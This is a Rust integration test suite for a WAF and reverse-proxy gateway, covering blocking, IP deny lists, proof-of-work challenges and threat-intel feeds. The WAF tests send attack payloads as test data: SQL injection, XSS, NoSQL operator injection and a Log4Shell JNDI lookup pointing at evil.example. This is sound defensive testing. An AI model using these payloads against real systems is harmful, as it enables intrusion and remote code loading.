//! End-to-end: real upstream app + gateway + HTTP client over TCP.

use std::convert::Infallible;
use std::io::Write;
use std::net::SocketAddr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

use bytes::Bytes;
use http_body_util::{BodyExt, Full};
use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper::{Request, Response, StatusCode};
use hyper_util::client::legacy::Client;
use hyper_util::rt::{TokioExecutor, TokioIo};
use pattern_guard_gateway::config::GatewayConfig;
use pattern_guard_gateway::intel::{IntelAction, IntelEntry};
use pattern_guard_gateway::ipnet::Cidr;
use pattern_guard_gateway::state::State;
use sha2::{Digest, Sha256};
use tokio::net::TcpListener;

/// Upstream app: echoes method, path and the bot-score header it received.
async fn start_upstream() -> SocketAddr {
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    tokio::spawn(async move {
        loop {
            let (s, _) = l.accept().await.unwrap();
            tokio::spawn(async move {
                let svc = service_fn(|req: Request<hyper::body::Incoming>| async move {
                    let score = req
                        .headers()
                        .get("x-pattern-guard-bot-score")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("none")
                        .to_string();
                    let body = format!("upstream {} {} bot_score={score}", req.method(), req.uri());
                    Ok::<_, Infallible>(Response::new(Full::new(Bytes::from(body))))
                });
                let _ = http1::Builder::new()
                    .serve_connection(TokioIo::new(s), svc)
                    .await;
            });
        }
    });
    addr
}

/// Mock CrowdSec LAPI: bans 192.0.2.70; records that the API key arrived.
async fn start_crowdsec(saw_key: Arc<AtomicBool>) -> SocketAddr {
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    tokio::spawn(async move {
        loop {
            let (s, _) = l.accept().await.unwrap();
            let saw = saw_key.clone();
            tokio::spawn(async move {
                let svc = service_fn(move |req: Request<hyper::body::Incoming>| {
                    let saw = saw.clone();
                    async move {
                        if req
                            .headers()
                            .get("x-api-key")
                            .map(|v| v == "test-key")
                            .unwrap_or(false)
                        {
                            saw.store(true, Ordering::SeqCst);
                        }
                        let startup = req.uri().query().unwrap_or("").contains("startup=true");
                        let body = if startup {
                            r#"{"new":[{"scope":"Ip","value":"192.0.2.70","type":"ban","origin":"CAPI","scenario":"crowdsecurity/http-probing","duration":"4h"}],"deleted":null}"#
                        } else {
                            r#"{"new":null,"deleted":null}"#
                        };
                        Ok::<_, Infallible>(Response::new(Full::new(Bytes::from(body))))
                    }
                });
                let _ = http1::Builder::new()
                    .serve_connection(TokioIo::new(s), svc)
                    .await;
            });
        }
    });
    addr
}

struct Gw {
    addr: SocketAddr,
    admin: SocketAddr,
    state: Arc<State>,
}

async fn start_gateway(extra: &str) -> Gw {
    let up = start_upstream().await;
    let toml = format!(
        "upstream = \"http://{up}\"\nmax_body_bytes = 100000\n{extra}\n[client_ip]\ntrusted_proxies = [\"127.0.0.1\"]\n[challenge]\ndifficulty = 8\n"
    );
    let cfg = GatewayConfig::from_toml_str(&toml).unwrap();
    let state = pattern_guard_gateway::build_state(cfg).unwrap();
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    let al = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let admin = al.local_addr().unwrap();
    pattern_guard_gateway::start_background(&state, Some(al)).unwrap();
    tokio::spawn(pattern_guard_gateway::serve(state.clone(), l));
    Gw { addr, admin, state }
}

struct Resp {
    status: StatusCode,
    headers: hyper::HeaderMap,
    body: String,
}

async fn send(
    addr: SocketAddr,
    method: &str,
    path: &str,
    headers: &[(&str, &str)],
    body: &str,
) -> Resp {
    let client = Client::builder(TokioExecutor::new()).build_http::<Full<Bytes>>();
    let mut b = Request::builder()
        .method(method)
        .uri(format!("http://{addr}{path}"));
    for (k, v) in headers {
        b = b.header(*k, *v);
    }
    let resp = client
        .request(b.body(Full::new(Bytes::from(body.to_string()))).unwrap())
        .await
        .unwrap();
    let status = resp.status();
    let headers = resp.headers().clone();
    let body =
        String::from_utf8_lossy(&resp.into_body().collect().await.unwrap().to_bytes()).into_owned();
    Resp {
        status,
        headers,
        body,
    }
}

fn between<'a>(s: &'a str, start: &str, end: &str) -> &'a str {
    let i = s.find(start).unwrap() + start.len();
    let j = s[i..].find(end).unwrap() + i;
    &s[i..j]
}

#[tokio::test]
async fn proxies_clean_traffic_and_forwards_bot_score() {
    let gw = start_gateway("").await;
    let r = send(
        gw.addr,
        "GET",
        "/hello?name=O%27Brien",
        &[("user-agent", "Mozilla/5.0")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK);
    assert!(
        r.body.starts_with("upstream GET /hello?name=O%27Brien"),
        "{}",
        r.body
    );
    assert!(
        !r.body.contains("bot_score=none"),
        "bot score forwarded: {}",
        r.body
    );
}

#[tokio::test]
async fn waf_blocks_attacks_in_query_body_and_headers() {
    let gw = start_gateway("").await;
    let r = send(
        gw.addr,
        "GET",
        "/search?q=%27%20OR%20%271%27%3D%271",
        &[],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    assert!(r.body.contains("blocked"));
    let r = send(
        gw.addr,
        "POST",
        "/comment",
        &[("content-type", "application/x-www-form-urlencoded")],
        "text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[("x-api-version", "${jndi:ldap://evil.example/a}")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let r = send(
        gw.addr,
        "POST",
        "/api/login",
        &[("content-type", "application/json")],
        r#"{"user": "admin", "password": {"$ne": null}}"#,
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    // a clean JSON body still passes
    let r = send(
        gw.addr,
        "POST",
        "/api/login",
        &[("content-type", "application/json")],
        r#"{"user":"ann","password":"it's me; really"}"#,
    )
    .await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.body);
}

#[tokio::test]
async fn excluded_params_are_not_inspected() {
    let gw = start_gateway("[waf]\nexclude_params = [\"html\"]").await;
    let r = send(
        gw.addr,
        "GET",
        "/save?html=%3Cscript%3Ex()%3C/script%3E",
        &[],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK);
}

#[tokio::test]
async fn deny_list_uses_client_ip_from_trusted_proxy() {
    let gw = start_gateway("[access]\ndeny = [\"192.0.2.0/28\"]").await;
    let r = send(gw.addr, "GET", "/", &[("x-forwarded-for", "192.0.2.5")], "").await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[("x-forwarded-for", "198.51.100.5")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK);
}

#[tokio::test]
async fn proof_of_work_challenge_round_trip() {
    let gw = start_gateway("").await;
    gw.state.intel.add(
        Cidr::parse("192.0.2.60").unwrap(),
        IntelEntry {
            action: IntelAction::Challenge,
            source: "test".into(),
            reason: "suspicious".into(),
            expires: None,
        },
    );
    let xff = ("x-forwarded-for", "192.0.2.60");
    let html = ("accept", "text/html");
    let page = send(gw.addr, "GET", "/shop?item=1", &[xff, html], "").await;
    assert_eq!(page.status, StatusCode::FORBIDDEN);
    assert!(page.body.contains("not a bot"));
    // API clients get JSON instead of a page
    let api = send(gw.addr, "GET", "/shop", &[xff], "").await;
    assert!(api.body.contains("challenge_required"));

    let vars = &page.body[page.body.find("var N=").unwrap()..];
    let nonce = between(vars, "var N=\"", "\"");
    let e = between(vars, ",E=", ",");
    let d: u32 = between(vars, ",D=", ",").parse().unwrap();
    let s = between(vars, ",S=\"", "\"");
    let counter = (0u64..)
        .find(|c| {
            let h = Sha256::digest(format!("{nonce}:{c}").as_bytes());
            pattern_guard_gateway::challenge::leading_zero_bits(&h) >= d
        })
        .unwrap();
    let verify = format!(
        "/.pattern-guard/verify?n={nonce}&e={e}&d={d}&s={s}&c={counter}&r=%2Fshop%3Fitem%3D1"
    );
    let v = send(gw.addr, "GET", &verify, &[xff], "").await;
    assert_eq!(v.status, StatusCode::FOUND);
    assert_eq!(v.headers.get("location").unwrap(), "/shop?item=1");
    let cookie = v
        .headers
        .get("set-cookie")
        .unwrap()
        .to_str()
        .unwrap()
        .split(';')
        .next()
        .unwrap()
        .to_string();

    let ok = send(
        gw.addr,
        "GET",
        "/shop?item=1",
        &[xff, html, ("cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(ok.status, StatusCode::OK, "{}", ok.body);
    // the cookie is bound to the IP it was issued for
    let other = send(
        gw.addr,
        "GET",
        "/shop",
        &[("x-forwarded-for", "192.0.2.61"), ("cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(
        other.status,
        StatusCode::OK,
        "other IP isn't flagged, so passes anyway"
    );
    gw.state.intel.add(
        Cidr::parse("192.0.2.61").unwrap(),
        IntelEntry {
            action: IntelAction::Challenge,
            source: "test".into(),
            reason: "x".into(),
            expires: None,
        },
    );
    let other = send(
        gw.addr,
        "GET",
        "/shop",
        &[("x-forwarded-for", "192.0.2.61"), ("cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(
        other.status,
        StatusCode::FORBIDDEN,
        "stolen cookie doesn't work from another IP"
    );
    // forged solution is rejected
    let bad = send(
        gw.addr,
        "GET",
        &verify.replace(&format!("s={s}"), "s=00ff"),
        &[xff],
        "",
    )
    .await;
    assert_eq!(bad.status, StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn crowdsec_decisions_are_enforced() {
    let saw_key = Arc::new(AtomicBool::new(false));
    let cs = start_crowdsec(saw_key.clone()).await;
    let gw = start_gateway(&format!(
        "[crowdsec]\nenabled = true\nurl = \"http://{cs}\"\napi_key = \"test-key\"\npoll_secs = 1"
    ))
    .await;
    for _ in 0..50 {
        if !gw.state.intel.is_empty() {
            break;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    assert!(saw_key.load(Ordering::SeqCst), "bouncer sent X-Api-Key");
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[("x-forwarded-for", "192.0.2.70")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let m = send(gw.admin, "GET", "/metrics", &[], "").await;
    assert!(
        m.body
            .contains("pattern_guard_blocked_total{layer=\"reputation\"} 1"),
        "{}",
        m.body
    );
    assert!(m.body.contains("pattern_guard_crowdsec_up 1"));
}

#[tokio::test]
async fn suricata_alerts_become_blocks() {
    let dir = std::env::temp_dir().join(format!("pg_gw_eve_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let eve = dir.join("eve.json");
    std::fs::write(&eve, "").unwrap();
    let gw = start_gateway(&format!(
        "[[feeds]]\nkind = \"suricata\"\npath = \"{}\"\nblock_secs = 60",
        eve.display()
    ))
    .await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    let mut f = std::fs::OpenOptions::new().append(true).open(&eve).unwrap();
    writeln!(
        f,
        r#"{{"event_type":"alert","src_ip":"192.0.2.80","dest_ip":"10.0.0.1","alert":{{"signature":"ET EXPLOIT test","severity":1}}}}"#
    )
    .unwrap();
    drop(f);
    for _ in 0..40 {
        if gw
            .state
            .intel
            .lookup("192.0.2.80".parse().unwrap())
            .is_some()
        {
            break;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[("x-forwarded-for", "192.0.2.80")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn detect_mode_logs_but_forwards() {
    let dir = std::env::temp_dir().join(format!("pg_gw_log_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let log = dir.join("decisions.jsonl");
    let gw = start_gateway(&format!(
        "mode = \"detect\"\n[log]\ndecisions = \"{}\"",
        log.display()
    ))
    .await;
    let r = send(
        gw.addr,
        "GET",
        "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
        &[],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK, "detect mode never interferes");
    let m = send(gw.admin, "GET", "/metrics", &[], "").await;
    assert!(
        m.body.contains("pattern_guard_would_mitigate_total 1"),
        "{}",
        m.body
    );
    for _ in 0..20 {
        if std::fs::read_to_string(&log)
            .map(|s| s.contains("\"xss\""))
            .unwrap_or(false)
        {
            break;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    let line = std::fs::read_to_string(&log).unwrap();
    let v: serde_json::Value = serde_json::from_str(line.lines().next().unwrap()).unwrap();
    assert_eq!(v["event_type"], "alert");
    assert_eq!(v["pattern_guard"]["enforced"], false);
    assert_eq!(v["pattern_guard"]["waf"][0]["class"], "xss");
    assert!(v["srcip"].is_string());
}

#[tokio::test]
async fn body_limit_and_admin_endpoints() {
    let gw = start_gateway("").await;
    let big = "a".repeat(200_000);
    let r = send(
        gw.addr,
        "POST",
        "/upload",
        &[("content-type", "text/plain")],
        &big,
    )
    .await;
    assert_eq!(r.status, StatusCode::PAYLOAD_TOO_LARGE);
    send(gw.addr, "GET", "/api/items/42", &[], "").await;
    send(gw.addr, "GET", "/api/items/43", &[], "").await;
    let inv = send(gw.admin, "GET", "/inventory", &[], "").await;
    assert!(inv.body.contains("GET /api/items/{n}"), "{}", inv.body);
    let h = send(gw.admin, "GET", "/healthz", &[], "").await;
    assert_eq!(h.body, "ok");
}

#[tokio::test]
async fn custom_rules_gatekeep() {
    let gw = start_gateway(
        r#"
[[rules]]
name = "admin only from office"
path = "/admin"
not_ips = ["10.0.0.0/8"]
action = "block"
[[rules]]
name = "trusted scanner"
headers = [{ name = "x-scanner-token", regex = "^s3cret$" }]
action = "allow"
[[rules]]
name = "no sqlmap"
user_agent_regex = "(?i)sqlmap"
action = "block"
"#,
    )
    .await;
    let outsider = ("x-forwarded-for", "203.0.113.5");
    let office = ("x-forwarded-for", "10.1.1.1");
    assert_eq!(
        send(gw.addr, "GET", "/admin/users", &[outsider], "")
            .await
            .status,
        StatusCode::FORBIDDEN
    );
    assert_eq!(
        send(gw.addr, "GET", "/admin/users", &[office], "")
            .await
            .status,
        StatusCode::OK
    );
    // an allow rule bypasses every other layer, even an obvious payload
    let r = send(
        gw.addr,
        "GET",
        "/search?q=%27%20OR%20%271%27%3D%271",
        &[outsider, ("x-scanner-token", "s3cret")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK);
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[outsider, ("user-agent", "sqlmap/1.8")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let m = send(gw.admin, "GET", "/metrics", &[], "").await;
    assert!(
        m.body
            .contains("pattern_guard_blocked_total{layer=\"rule\"} 2"),
        "{}",
        m.body
    );
}
